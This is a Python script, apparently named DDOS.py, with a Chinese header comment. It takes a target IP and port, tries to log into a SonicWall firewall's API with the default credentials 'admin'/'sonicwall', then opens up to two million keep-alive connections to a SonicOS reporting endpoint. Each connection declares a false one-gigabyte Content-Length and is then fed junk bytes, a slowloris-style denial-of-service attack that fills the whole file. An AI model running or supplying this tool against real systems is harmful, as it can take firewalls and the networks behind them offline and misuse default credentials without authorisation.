#coding:utf-8
"""
Author:Hou Yuling
Time:6/27/2022 4:24 PM
Ubuntu出现报错： OSError: [Errno 24] Too many open files
解决方案：
ulimit -n 1000000
sysctl -w fs.file-max=1000000
"""
import socket
import time
import sys
from threading import *
import requests
from requests.auth import HTTPBasicAuth
import json
import urllib3
import argparse
urllib3.disable_warnings()

parser=argparse.ArgumentParser(description="python DDOS.py --ip x.x.x.x --port xx ")
parser.add_argument('--ip',type=str,required=True,help='specify target ip')
parser.add_argument('--port', type=int, required=True, help='specify target port')
args=parser.parse_args()

MAX_CONN = 2000000
connection_lock = BoundedSemaphore(value=MAX_CONN)
PORT = args.port
HOST = args.ip
PAGE = "/api/sonicos/reporting/status/system"

buf = ("GET %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Referer: https://%s/\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36\r\n"
       "Content-Length: 1000000000\r\n"
       "Connection:keep-alive"
       "\r\n" % (PAGE, HOST,HOST))

socks = []

def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            #print(buf)
            s.send(bytes(buf, encoding='utf-8'))
            print("[+] Send buf OK!,conn=%d" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(2)


def send_thread():
    global socks
    for i in range(10):
        for s in socks:
            try:
                s.send(bytes("ddos", encoding='utf-8'))
                print("[+] send OK!")
            except Exception as ex:
                print("[-] send Exception:%s" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)
def Login_fw(host,username,password):
    s=requests.Session()
    url = "https://"+host+"/api/sonicos/auth"
    payload = {"override": 'false', "snwl": 'true'}
    data = json.dumps(payload)
    header = {
        'Conection': 'keep alive',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8'
    }
    try:
        #requests.packages.urllib3.disable_warnings()
        re = s.post(url, auth=HTTPBasicAuth(username, password), headers=header, data=data, verify=False)
        print(re.json())
        re.raise_for_status()
        print(re)
        if (re.status_code == 200):
            print("Login successful.")
    except requests.exceptions.RequestException as e:
        print("- LoginERROR - Web service exception, msg  {}".format(e))
    time.sleep(2)

if __name__=="__main__":
    username="admin"
    password="sonicwall"
    Login_fw(HOST,username,password)
    #线程锁避免多线程出现错误
    connection_lock.acquire()
    conn_th = Thread(target=conn_thread, args=())
    send_th = Thread(target=send_thread, args=())
    conn_th.start()
    send_th.start()